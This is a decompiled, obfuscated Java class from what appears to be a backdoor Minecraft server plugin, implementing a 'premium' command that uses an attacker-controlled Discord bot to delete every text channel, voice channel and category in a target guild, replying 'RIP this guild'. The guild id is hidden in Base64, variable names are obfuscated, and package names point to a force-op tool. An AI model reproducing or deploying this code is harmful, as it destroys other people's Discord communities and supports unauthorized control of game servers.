/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl.premium.bot;

import com.minecraftforceop.jda.jda.api.entities.Guild;
import java.util.Base64;
import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.data.DataManager;
import me.system.runner.utils.Settings;
import org.bukkit.entity.Player;

public class DelchannelsCommand
extends Command {
    @Override
    public void execute(Core llllllllllllllIIIIIIllIIIllIlllI, String llllllllllllllIIIIIIllIIIllIllIl, String[] llllllllllllllIIIIIIllIIIllIllII, Player llllllllllllllIIIIIIllIIIllIlIIl) {
        if (llllllllllllllIIIIIIllIIIllIlllI.premium.contains(llllllllllllllIIIIIIllIIIllIlIIl.getName())) {
            if (llllllllllllllIIIIIIllIIIllIlllI.botEnabled) {
                byte[] llllllllllllllIIIIIIllIIIlllIIIl = Base64.getDecoder().decode(DataManager.getData().getString("id"));
                Guild llllllllllllllIIIIIIllIIIlllIIII = llllllllllllllIIIIIIllIIIllIlllI.jda.getGuildById(new String(llllllllllllllIIIIIIllIIIlllIIIl));
                if (llllllllllllllIIIIIIllIIIlllIIII == null) {
                    llllllllllllllIIIIIIllIIIllIlIIl.sendMessage(Settings.PREFIX("The bot doesn't seem to be in the guild set! Use setguild"));
                } else {
                    llllllllllllllIIIIIIllIIIlllIIII.getTextChannels().forEach(llllllllllllllIIIIIIllIIIlIlllIl -> llllllllllllllIIIIIIllIIIlIlllIl.delete().complete());
                    llllllllllllllIIIIIIllIIIlllIIII.getVoiceChannels().forEach(llllllllllllllIIIIIIllIIIllIIIII -> llllllllllllllIIIIIIllIIIllIIIII.delete().complete());
                    llllllllllllllIIIIIIllIIIlllIIII.getCategories().forEach(llllllllllllllIIIIIIllIIIllIIlII -> llllllllllllllIIIIIIllIIIllIIlII.delete().complete());
                    llllllllllllllIIIIIIllIIIllIlIIl.sendMessage(Settings.PREFIX("RIP this guild"));
                }
            } else {
                llllllllllllllIIIIIIllIIIllIlIIl.sendMessage(Settings.PREFIX("The bot doesn't seem to be logged in! Use settoken"));
            }
        } else {
            llllllllllllllIIIIIIllIIIllIlIIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You must be a ").append(Settings.RED).append("premium user ").append(Settings.WHITE).append(" to execute this command"))));
        }
    }

    public DelchannelsCommand() {
        DelchannelsCommand llllllllllllllIIIIIIllIIIlllIllI;
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

